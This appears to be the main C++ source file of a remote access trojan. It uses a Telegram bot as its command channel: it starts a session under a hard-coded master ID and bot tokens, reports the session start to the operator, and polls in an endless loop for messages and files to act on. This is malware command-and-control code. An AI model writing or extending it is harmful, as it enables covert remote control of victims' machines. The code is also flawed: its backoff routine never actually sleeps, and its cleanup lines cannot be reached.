#include "macro.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/Handler.hpp"
#include "logging.hpp"
#include "rat/system.hpp"

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <csignal>
#include <cstdint>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>

#ifdef _WIN32
#  include <windows.h>
#endif

// ==============================
// Original globals / helpers
// ==============================
static uint32_t empty_updates_count = 0;
static std::atomic<uint32_t> sleep_timeout_ms{500};
std::string init_message;

// Forward decls
static void botLoop();
static inline bool _isUpdateEmpty(const ::rat::tbot::Update& arg_Update);
static void _dynamicSleep(uint32_t arg_Count);

// ==============================
// main
// ==============================
int main() {
    botLoop();
    return 0;
}

static void botLoop() {

    DEBUG_LOG("Bot constructing");

    if (init_message.empty()) {
        init_message = fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime());
    }

    rat::handler::Handler session_handler;
    
    session_handler.setMasterId(MASTER_ID);
    session_handler.initMainBot(TOKEN1_odahimbotzawzum);
    session_handler.initBackingBot(TOKEN_ODAHIMBOT);
    session_handler.initCurlClient(1);
    session_handler.initThreadPools(1, 1);

    session_handler.bot->sendMessage(init_message);

    empty_updates_count = 0;

    while (true) {
        ::rat::tbot::Update update = session_handler.bot->getUpdate();


        if (_isUpdateEmpty(update)) {
            ++empty_updates_count;
        } else {
            session_handler.handleUpdate(std::move(update));
        }

        _dynamicSleep(empty_updates_count);


    }


    DEBUG_LOG("Bot loop exiting — letting destructors clean up (RAII).");
    session_handler.bot->sendMessage("The session is being destroyed");
}

// ==============================
// Helpers
// ==============================
static inline bool _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
    return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
}

static void _dynamicSleep(uint32_t arg_Count) {
    // Base/backoff are kept similar to your original
    constexpr uint32_t base_sleep_ms = 500;
    constexpr double   growth_factor = 1.001; // very gentle growth
    constexpr uint32_t max_sleep_ms  = 5000;

    // compute with double then clamp
    double computed = base_sleep_ms * std::pow(growth_factor, static_cast<double>(arg_Count));
    if (computed > max_sleep_ms) computed = max_sleep_ms;

    sleep_timeout_ms.store(static_cast<uint32_t>(computed), std::memory_order_relaxed);
}
